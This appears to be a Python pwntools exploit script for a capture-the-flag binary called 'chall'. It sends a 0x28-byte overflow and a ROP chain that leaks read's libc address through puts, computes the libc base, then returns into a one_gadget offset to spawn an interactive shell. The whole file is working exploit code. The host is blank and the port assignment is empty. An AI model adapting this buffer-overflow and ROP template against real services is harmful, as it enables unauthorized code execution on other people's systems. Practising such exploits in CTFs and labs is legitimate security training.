from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
HOST = ''
PORT = 

binf = ELF(bin_file)
libc = ELF('./libc.so.6')

def attack(io, **kwargs):
    io.sendlineafter('*', 'a')
    io.sendlineafter('*', 'a')
    io.sendlineafter('*', '18')
    
    exploit = b'a' * 0x28
    rop = ROP(binf)
    rop.puts(binf.got['read'])
    rop.main()
    exploit += rop.chain()

    io.sendlineafter('*', exploit)
    io.recvuntil('your')
    io.recvline()
    leak = unpack(io.recv(6), 'all')
    libc.address = leak - libc.symbols['read']
    onegad = [0x4f3d5, 0x4f432, 0x10a41c]

    io.sendlineafter('*', 'a')
    io.sendlineafter('*', 'a')
    io.sendlineafter('*', '18')
    io.sendlineafter('*', b'a'*0x28 + p64(libc.address + onegad[1]))


def main():
    #io = process(bin_file)
    io = remote(HOST, PORT)
    attack(io)
    #gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
